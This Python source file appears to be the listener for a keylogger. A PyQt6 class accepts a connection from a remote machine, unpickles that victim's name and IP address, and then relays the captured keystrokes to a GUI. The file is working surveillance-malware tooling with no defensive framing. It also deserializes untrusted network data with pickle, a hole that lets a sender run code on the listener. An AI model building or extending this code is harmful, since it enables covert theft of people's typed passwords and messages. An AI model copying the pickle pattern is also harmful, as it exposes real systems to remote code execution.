import socket
import threading
import pickle
from PyQt6.QtCore import QObject, pyqtSignal


class Connect(QObject):
    info_received = pyqtSignal(str, str)  # name, ip
    keystroke_received = pyqtSignal(str)  # keystroke data
    message_received = pyqtSignal(str)  # message

    def __init__(self, port: int):
        super().__init__()
        self.port = port
        self.sock = None
        self.conn = None
        self.addr = None
        self.running = False

    def activate(self):
        """Start server socket in a background thread"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(("0.0.0.0", self.port))
        self.sock.listen(1)
        self.running = True

        threading.Thread(target=self._accept_loop, daemon=True).start()

    def _accept_loop(self):
        self.message_received.emit("Waiting for connection...")
        self.conn, self.addr = self.sock.accept()
        self.message_received.emit("Connected")

        # Receive first payload (pickled list)
        first_data = self.conn.recv(1024)
        try:
            data_list = pickle.loads(first_data)
            name, ip = data_list[0], data_list[1]
            self.info_received.emit(name, ip)  # emit signal to GUI
        except Exception as e:
            self.message_received.emit("Failed to parse initial data:", e)

        # Start listening for keystrokes
        threading.Thread(target=self._recv_loop, daemon=True).start()

    def _recv_loop(self):
        """Continuous loop for keystrokes"""
        while self.running:
            try:
                raw = self.conn.recv(1024)
                if not raw:
                    break
                keystrokes = raw.decode(errors="ignore")
                self.keystroke_received.emit(keystrokes)  # emit signal
            except OSError:
                break

    def exit(self):
        self.running = False
        if self.conn:
            self.conn.close()
        if self.sock:
            self.sock.close()


def get_myIp() -> str:
    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    soc.connect(("8.8.8.8", 80))
    private_ip = soc.getsockname()[0]
    soc.close()
    return private_ip
